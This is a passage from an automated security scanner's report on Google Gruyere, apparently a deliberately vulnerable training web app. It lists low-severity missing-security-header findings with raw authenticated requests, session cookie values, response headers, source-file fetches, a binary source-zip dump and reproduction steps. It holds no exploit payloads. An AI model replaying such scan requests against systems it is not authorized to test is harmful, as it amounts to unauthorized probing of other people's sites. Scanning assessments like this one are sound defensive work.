    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:33:00 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 8cae464cbab157d83f6a5dfdce0e4092
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
       "https://www.w3.org/TR/html4/frameset.dtd">
    <HTML>
    <HEAD>
    <TITLE>Gruyere Code</TITLE>
    </HEAD>
    <FRAMESET cols="165,100%">
      <FRAME src="/static/codeindex.html">
      <FRAME name="codepage" src="">
      <NOFRAMES>
        <A href="/static/codeindex/html">Code Index</A>
      </NOFRAMES>
    ... [2 more lines, 353 chars total]
  elapsed_ms: 234.5
  --- RAW REQUEST req-456ae049 (exactly as issued by the engine) ---
  GET /code/?data.py=
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 354
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:33:05 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: b14bb7bf90d980612b5f0f6f393a15fb
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
       "https://www.w3.org/TR/html4/frameset.dtd">
    <HTML>
    <HEAD>
    <TITLE>Gruyere Code</TITLE>
    </HEAD>
    <FRAMESET cols="165,100%">
      <FRAME src="/static/codeindex.html">
      <FRAME name="codepage" src="">
      <NOFRAMES>
        <A href="/static/codeindex/html">Code Index</A>
      </NOFRAMES>
    ... [2 more lines, 353 chars total]
  elapsed_ms: 232.9
  --- RAW REQUEST req-1bc70a43 (exactly as issued by the engine) ---
  GET /code/?gtl.py=
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 354
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:33:11 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: d89158ced311d1599acb306439ebad3d
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
       "https://www.w3.org/TR/html4/frameset.dtd">
    <HTML>
    <HEAD>
    <TITLE>Gruyere Code</TITLE>
    </HEAD>
    <FRAMESET cols="165,100%">
      <FRAME src="/static/codeindex.html">
      <FRAME name="codepage" src="">
      <NOFRAMES>
        <A href="/static/codeindex/html">Code Index</A>
      </NOFRAMES>
    ... [2 more lines, 353 chars total]
  elapsed_ms: 226.1
  --- RAW REQUEST req-a6959ed8 (exactly as issued by the engine) ---
  GET /code/?sanitize.py=
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 354
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:33:17 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 7fd12cd9390c82ade39308a1d3451a16
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
       "https://www.w3.org/TR/html4/frameset.dtd">
    <HTML>
    <HEAD>
    <TITLE>Gruyere Code</TITLE>
    </HEAD>
    <FRAMESET cols="165,100%">
      <FRAME src="/static/codeindex.html">
      <FRAME name="codepage" src="">
      <NOFRAMES>
        <A href="/static/codeindex/html">Code Index</A>
      </NOFRAMES>
    ... [2 more lines, 353 chars total]
  elapsed_ms: 230.4
  --- RAW REQUEST req-198f5e7a (exactly as issued by the engine) ---
  GET /code/?resources%2Ffeed.gtl=
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 354
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:33:23 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: e846dfafa3d9b87e21664677ffda5249
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
       "https://www.w3.org/TR/html4/frameset.dtd">
    <HTML>
    <HEAD>
    <TITLE>Gruyere Code</TITLE>
    </HEAD>
    <FRAMESET cols="165,100%">
      <FRAME src="/static/codeindex.html">
      <FRAME name="codepage" src="">
      <NOFRAMES>
        <A href="/static/codeindex/html">Code Index</A>
      </NOFRAMES>
    ... [2 more lines, 353 chars total]
  elapsed_ms: 246.1
  --- RAW REQUEST req-a5c7b2db (exactly as issued by the engine) ---
  GET /code/?resources%2Ferror.gtl=
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 354
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:33:28 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 04fcd20c44f7deb0535087a40c940d46
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
       "https://www.w3.org/TR/html4/frameset.dtd">
    <HTML>
    <HEAD>
    <TITLE>Gruyere Code</TITLE>
    </HEAD>
    <FRAMESET cols="165,100%">
      <FRAME src="/static/codeindex.html">
      <FRAME name="codepage" src="">
      <NOFRAMES>
        <A href="/static/codeindex/html">Code Index</A>
      </NOFRAMES>
    ... [2 more lines, 353 chars total]
  elapsed_ms: 243.2
  --- RAW REQUEST req-7901bbd2 (exactly as issued by the engine) ---
  GET /code/?resources%2Fhome.gtl=
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 354
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:33:34 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 7b05d9e8da58ec4229e46604c7a35aee
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
       "https://www.w3.org/TR/html4/frameset.dtd">
    <HTML>
    <HEAD>
    <TITLE>Gruyere Code</TITLE>
    </HEAD>
    <FRAMESET cols="165,100%">
      <FRAME src="/static/codeindex.html">
      <FRAME name="codepage" src="">
      <NOFRAMES>
        <A href="/static/codeindex/html">Code Index</A>
      </NOFRAMES>
    ... [2 more lines, 353 chars total]
  elapsed_ms: 240.0
  --- RAW REQUEST req-b191adf1 (exactly as issued by the engine) ---
  GET /code/?resources%2Feditprofile.gtl=
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 354
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:33:39 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 62f09cff46033e0472b123d8888c197f
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
       "https://www.w3.org/TR/html4/frameset.dtd">
    <HTML>
    <HEAD>
    <TITLE>Gruyere Code</TITLE>
    </HEAD>
    <FRAMESET cols="165,100%">
      <FRAME src="/static/codeindex.html">
      <FRAME name="codepage" src="">
      <NOFRAMES>
        <A href="/static/codeindex/html">Code Index</A>
      </NOFRAMES>
    ... [2 more lines, 353 chars total]
  elapsed_ms: 242.9
  --- RAW REQUEST req-98370ed3 (exactly as issued by the engine) ---
  GET /code/?resources%2Fmanage.gtl=
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 354
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:33:44 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 8233994581868ba4b8785d81297196f4
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
       "https://www.w3.org/TR/html4/frameset.dtd">
    <HTML>
    <HEAD>
    <TITLE>Gruyere Code</TITLE>
    </HEAD>
    <FRAMESET cols="165,100%">
      <FRAME src="/static/codeindex.html">
      <FRAME name="codepage" src="">
      <NOFRAMES>
        <A href="/static/codeindex/html">Code Index</A>
      </NOFRAMES>
    ... [2 more lines, 353 chars total]
  elapsed_ms: 255.7
  --- RAW REQUEST req-a7b5e1fc (exactly as issued by the engine) ---
  GET /code/?resources%2Fmenubar.gtl=
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 354
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:33:50 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: af0157f637a03a1e1595fb5fa8e3997c
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
       "https://www.w3.org/TR/html4/frameset.dtd">
    <HTML>
    <HEAD>
    <TITLE>Gruyere Code</TITLE>
    </HEAD>
    <FRAMESET cols="165,100%">
      <FRAME src="/static/codeindex.html">
      <FRAME name="codepage" src="">
      <NOFRAMES>
        <A href="/static/codeindex/html">Code Index</A>
      </NOFRAMES>
    ... [2 more lines, 353 chars total]
  elapsed_ms: 236.8
  --- RAW REQUEST req-d1d8d58c (exactly as issued by the engine) ---
  GET /code/?resoources%2Fdump.gtl=
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 354
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:33:55 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: fd33526510e197fdb9cdc3c7236bfcb7
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
       "https://www.w3.org/TR/html4/frameset.dtd">
    <HTML>
    <HEAD>
    <TITLE>Gruyere Code</TITLE>
    </HEAD>
    <FRAMESET cols="165,100%">
      <FRAME src="/static/codeindex.html">
      <FRAME name="codepage" src="">
      <NOFRAMES>
        <A href="/static/codeindex/html">Code Index</A>
      </NOFRAMES>
    ... [2 more lines, 353 chars total]
  elapsed_ms: 225.3
  --- RAW REQUEST req-3743df9f (exactly as issued by the engine) ---
  GET /code/?resources%2Fdump.gtl=
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 354
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:34:00 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 14b732d5c9ac4787816f21377854e2ab
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
       "https://www.w3.org/TR/html4/frameset.dtd">
    <HTML>
    <HEAD>
    <TITLE>Gruyere Code</TITLE>
    </HEAD>
    <FRAMESET cols="165,100%">
      <FRAME src="/static/codeindex.html">
      <FRAME name="codepage" src="">
      <NOFRAMES>
        <A href="/static/codeindex/html">Code Index</A>
      </NOFRAMES>
    ... [2 more lines, 353 chars total]
  elapsed_ms: 236.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/code/ as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F13] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/gruyere-code.zip (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-245dd326 (exactly as issued by the engine) ---
  GET /gruyere-code.zip
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    age: 150
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: public, max-age=600
    content-length: 35401
    content-type: application/zip
    date: Sat, 03 Oct 2026 01:30:29 GMT
    etag: "3m8CBg"
    expires: Sat, 03 Oct 2026 01:40:29 GMT
    server: Google Frontend
    x-cloud-trace-context: de054abcacb09c4b2c516631ebd1c5c4
  body:
    PK\x03\x04\x14\x00\x02\x00\x08\x00�K�Je!�9\x0c\x04\x00\x00�	\x00\x00\x07\x00\x1c\x00data.pyUT	\x00\x03�RLY�RLYux\x0b\x00\x01\x04�\x08\x07\x00\x04�\x13\x00\x00�Vmo�6\x10��_q�>�Ej)�Pt�\x14n��\x01���]\x14�0\x18�x��J$˗8����#�$�c�\x1b�		d���=�\x17\x0e\x06�\x0b�\x1b4\x08C8�\x05�\x03�\x1c��2Љ^\x00�\x15΁i]��9�$��+�T\x15�,IN�n�X�\x0e^\x1e\x1c��\x0b��\x15¥,2\x18W\x15D�\x05�\x16�-r�0-��Bq\x04z\x13&J�\x1c��h��\x08�sڎ�0H�n�Pu��͔Y杺���P���� �6ON;U8mua�\x11s\x1f�\x1d^+
    Έ�V�2_-�F�$�#�\x13�\x1c>8B������\x14No>~����	�:;�����\x10>�֌��X-����	I�[	��F��M,\x16�\x08�t\x14¥\x0bPڨ[�is �[l7\x05B>\x13ڸ�v~�+%�T&yB�\x16\x19��Vl��\x17�f\x0dԊ�E\x13\x11"�\x01�QހZ��@)褸\x12r\x19��\x0e\x01���\x18A���\x10�e\x13#X�\x15�h���\x11�\x00�+�h�I-HI�\x08\x16\x11�\x18��a!�m\x0c�\x02�\x14��}�-ho�
    �<0\x11��\x03:���W��\x14q\82�\x10l��>���li��T��)�:�3��#��>�V�U��i�Qn�X�(s��aA����<\x19\x0c\x06I2�1�Jef38��-y��\x01�L�I�\x0b��:�\x03#�N2\x11�V�\x11/��4:\x7f7��a:;\x1bOǴ��\x04�I\x19��\x0c|2�L:ꖣH�\x1ai%\x1d\x07��ţ@��2e�A�_\x17�s���XeqC\x16qF05�/ѱ\x14pf�К\x00	��\x01ͬ])�\x03ϭ�\x0c.��vo�&)�g��&��Ag����ݶ��+-J��\x08��\x15�\x15+�\x06�\x0c�K�\x15�Ft��7)�\x1e�dr\x1db>bP\x1a\\x1c\x0fvD���\x03Җ�N���|�����oÃW��×\x07����Q�N��Q)j���гK�\x1ds���&ڇ(T\x159H�_\x13t!Z����vz_-\x14rl\x0c\x01�rޭ�+�\x0bB��q�\x7f	+\x15;�\x08u\x1e�X��\x0d�w5��X�\x19=�\x03�_�9a��j{F\	ka\x12�O\x13�\x1bf��|���V���eT\x08\x0f�P5�*��5�\x0d\x03M��\x08��c����g��:�\x0d���k��\x15��S���|C�\x1f�\x15�HH\x14KN<v����L$\x16YQ(/��)\x7f\x12Wki\x1f�\x1fY�\x0c�������\x0dy�9f�(�$*����"\x02s����#�v�u����j&�����hxDVO����� 9ٖ�ߓ$�4\x15�K�\x19ݩ�=\x1f��f��v�Y�;n\Y\x18<@7&獌�$�:�x�\x1f*ϓ\x1fPK\x03\x04\x14\x00\x02\x00\x08\x00}��J�\x7f�}�\x1d\x00\x00\x0cl\x00\x00
    \x00\x1c\x00gruyere.pyUT	\x00\x03n�LYn�LYux\x0b\x00\x01\x04�\x08\x07\x00\x04�\x13\x00\x00�<ks�F���+&v�\x00l(P�^UR�r�d��Uq$�D]6��X 0$\x11�\x00�\x01Lq�������\x00\x04�Jn��J�<zz�===|�ͨ\x12�h\x1e�#�~b��\e���`��ŋwE��\x05g{,`\x1b>gA�'q\x18�q��M\��*K��\x07��,�\x16�rU����߱wY�L8;MC�\x1d%	�.�
    .x�G0a��\x05\x0b��3�\x0b0y*xĪ4�\x05+W|�*�\\x1c�Fa�a�O<���,\x15~V,Gj�\x18ͷ{i4���\x0f[\x18\x0d��Pv,ǲ��,�y���e�\x17�'9���(\x18Ld�i\��WePr�\x08�wr��Χ����\x176}\x7fz\x05�N&�(�m2�W&�\x01�R�d�\x17fi\x19�)��$XZ�y�Ub xX\x15q�U$d�%�ʋ�S\x1c��EV�Jp9	\x08�~\x06hG\x16��]�d1\x105H��	_\x10E��I0��/Y������(^l	\x02Q\x1b�n��`�&�\x0b�b�T���\x08� 0�\x1b\x0e$ iV�(\x16����\x11�\x18\x10��>{S�|��]ȋ\x1cp�\x160(\x16\x04� �9.&�ţJ�!H\x18|�S\x00\��!��<Ý\x18J\x10 �\x00X�\x14��s�\x14�8,a�-�E̵�"�����dFxNy�&|�@�\x00�\x11��f�/IL}��\x11@L@\x01Fy\x06\x14�A�J�8B%\x18\x0cf��\x02�(f36f�\x1b���\x0f|\x1e��`𒉭(�\x1a)R\x01'\x07�"[�7����\x0b\\x15$:^�YQ��K�{�E�\x1eX���\x19u�@����|��Ï	�_3�?\x15\x008[�o���X�@G" �n��$��\x12\x03��\x07\x05�D�G�\x07���\x1e\x0e\x18\x02�#\x10��\x06\x04���ے\x13��lZT|��\x07�h�㓢�
    ��\x07B �P�4��\x1aQP\x06��L\x06�xofoO?L��#Qf\x05��p�_ޕ��jr|9�Z\x038؇R�\x0dNϮ�G\x1f>�.����w\x06�������i\x03\x0b\x04X�\�������ч������\x04o\x16f�ǘ;����\�5\x03�\��ԝ'o�=�[�.�~��Ã"X������\x1fד��	�Vi\x0c"0�#�C�?��]\x15������Nϰ1\x16� Z�i�s=}\x7f~��H8\x01\x12����(��\x10�\x1b\x06��\x08B�\x15��d�\x02\x04\x1c�\x0ch!��3�H\x05O�����*.gj֘�\x0d\x12����-�l\x0e�\x1a�ɗ�Ή�s\x10`&P낒����D7�Aʂ\x10\x17bq�\x0f$Wg8\x07\x00�e)��\x02\x18K���o\x1c4�Ե�B\x0f>b���S�Tʴ�Ζ<�\x05\x18r�
    �
    l\x084�\x0eAJAW�������:\x07g�.��l�)p@OR�h\x13�]	F5FO\x02�Ԓ�P\x08���Cs�-��_�3��\x1d��M'g�����	
    �g�\x01\x06�\x18
    �\x1c2�\x04�#�<T��x���:X�\x11~�\x1d�rm&����H�{~�%,�3�-�\x14����\x1e��e�"}���z����/�#\x0e���n\x0f���\x0f\x114��	8ƺ���\x0b�p\x04�d\x0d_]\x0fm�\x0c\x04\x1a�50�$\x06b��l]o\x00=J\x0c-1��N�e�%HN�>z;4�"K�-�%:,�9��PjF$%I\x16\x06�*\x13�gN\x17�Y\x08�&��\x08\x02���_\x002�h�Y\x19�\x03��\x05Q\x042\x03�lH^	� \\x05�\x12�\x11�,��\x1a�v�\x04\x01PL@�\x15\*j2�Fj�a��״E�\x02�l\x04�x����;\x05\x1b�"k6�1\x02�C�j���+1^\x07�
    �\x16A���@M�\����>\x12��P��?\x1f]�����������ٻ	\x04O\x13���Ç󟡓�\x01������:�©]A\x15pp\x0b*HAN0\x07/�\x11R\x19|�H&��X\x01�!�4�\x08R\x12��vU���H\x00J
    ��\x12b���<�K�@��GA\x01�0�c���i�M\x19���\x10�a\x10\x04a��u\x0c\x18\x11\x1c�皂�^��C�	4|�\x15`�!\x00�\x14f閝^�鰘���DY�r�>ʒ)��L�\x1a�5�\x02\x01��ٻ�t\x04\x7f.ί���Q�+���%E4(*`\x10T�%�n\x05\x0b\x04�j\x11\x17�\x1d8�R�D\x1e@ԉ�%�ADXܷ\x11\x0cP���0͆��p\x00#� %@|�C�K�!�\x0cW\x00$"�� ��\x16�'4\x1ehP<C����QUfk\x10�\x10\x15�v_\x07 �U!�����>jO�F�C�\x05)���\�2@� h�:B��$\x1cVS~O\x19��JSr
    ... [5 more lines, 5869 chars total]
  elapsed_ms: 42.4
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/gruyere-code.zip as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F14] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-ebf019f3 (exactly as issued by the engine) ---
  GET /530506698111053146050861906974275631884
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 3835
    content-type: text/html
    date: Sat, 03 Oct 2026 01:34:06 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: f277af0edae15423279796db129a8b1d
    x-xss-protection: 0
  redirect_chain: [[302, 'https://google-gruyere.appspot.com/530506698111053146050861906974275631884/']]
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <!-- Copyright 2017 Google Inc. -->
    <html>
    <head>
    <title>Gruyere: Home</title>
    <style>
    /* Copyright 2017 Google Inc. */
    
    body, html, td, span, div, input, textarea {
      font-family: sans-serif;
      font-size: 14pt;
    }
    ... [192 more lines, 3834 chars total]
  elapsed_ms: 627.8
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F15] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/lib.js (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-d1f6056b (exactly as issued by the engine) ---
  GET /530506698111053146050861906974275631884/lib.js
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: public, max-age=7200
    content-length: 1962
    content-type: application/javascript
    date: Sat, 03 Oct 2026 01:34:07 GMT
    server: Google Frontend
    x-cloud-trace-context: 80694236f5562136b1b72eab5e0f52ee
    x-xss-protection: 0
  body:
    /* Copyright 2017 Google Inc. */
    /**
     * Swaps the display settings of two elements. Before calling, exactly one
     * of the two elements should have style="display:none" and it shows the one
     * that is hidden and hides the one that is shown.
     */
    function _showHide(id1, id2) {
      var x1 = document.getElementById(id1);
      var x2 = document.getElementById(id2);
      var shown = x1.style.display != '';
      x1.style.display = shown ? '' : 'none';
      x2.style.display = shown ? 'none' : '';
    ... [58 more lines, 1961 chars total]
  elapsed_ms: 334.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/lib.js as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F16] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/ (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-4aa130b2 (exactly as issued by the engine) ---
  GET /530506698111053146050861906974275631884/
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 3835
    content-type: text/html
    date: Sat, 03 Oct 2026 01:34:08 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 6f894323f592cc98a715879c32027954
    x-xss-protection: 0
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <!-- Copyright 2017 Google Inc. -->
    <html>
    <head>
    <title>Gruyere: Home</title>
    <style>
    /* Copyright 2017 Google Inc. */
    
    body, html, td, span, div, input, textarea {
      font-family: sans-serif;
      font-size: 14pt;
    }
    ... [192 more lines, 3834 chars total]
  elapsed_ms: 364.1
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/ as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F17] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/login (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-4948f85f (exactly as issued by the engine) ---
  GET /530506698111053146050861906974275631884/login
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
